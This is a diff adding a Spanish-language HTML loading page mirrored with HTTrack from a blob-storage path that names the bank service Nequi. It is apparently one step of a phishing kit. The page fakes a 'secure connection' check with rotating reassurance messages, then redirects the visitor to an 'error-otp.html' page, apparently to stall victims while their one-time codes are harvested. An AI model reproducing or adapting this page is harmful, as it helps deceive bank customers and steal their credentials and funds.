@@ -1,0 +1,81 @@
+﻿<!DOCTYPE html>
+<html lang="es">
+
+<!-- Mirrored from sistemarickymorty.blob.core.windows.net/pave/bancos/nequi/propulsor/recargas/load2.php.html by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 12 May 2026 03:02:13 GMT -->
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Cargando...</title>
+  <style>
+    body {
+      font-family: 'Manrope', sans-serif;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      background-color: #fff;
+    }
+    #logo {
+      width: 150px;
+      margin-bottom: 30px;
+    }
+    .loader {
+      border: 6px solid #f3f3f3;
+      border-radius: 50%;
+      border-top: 6px solid #E0128B;
+      width: 50px;
+      height: 50px;
+      animation: spin 1s linear infinite;
+      margin-bottom: 20px;
+    }
+    .mensaje {
+      font-size: 18px;
+      color: #333;
+      text-align: center;
+      padding: 0 10px;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
+  <link href="../../css2-5bf16?family=Manrope&amp;display=swap" rel="stylesheet">
+</head>
+<body>
+  <img src="logo-5.png" alt="Logo" id="logo">
+  <div class="loader"></div>
+  <div class="mensaje" id="mensaje">Estableciendo conexión segura...</div>
+
+  <script>
+    const mensajes = [
+      "Estableciendo conexión segura...",
+      "Casi listo, verificando datos...",
+      "Procesando información...",
+      "Esto no tardará mucho, gracias por tu paciencia...",
+      "Estamos finalizando el proceso...",
+      "¡Un momento más, casi terminamos!"
+    ];
+
+    let indiceMensaje = 0;
+    const mensajeElemento = document.getElementById('mensaje');
+
+    function cambiarMensaje() {
+      indiceMensaje++;
+      mensajeElemento.textContent = mensajes[indiceMensaje];
+
+      if (indiceMensaje === mensajes.length - 1) {
+        clearInterval(mensajeInterval);
+        setTimeout(() => {
+          window.location.href = "error-otp.html";
+        }, 1000);
+      }
+    }
+
+    const mensajeInterval = setInterval(cambiarMensaje, 2000);
+  </script>
+</body>
+
+<!-- Mirrored from sistemarickymorty.blob.core.windows.net/pave/bancos/nequi/propulsor/recargas/load2.php.html by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 12 May 2026 03:02:15 GMT -->
+</html>
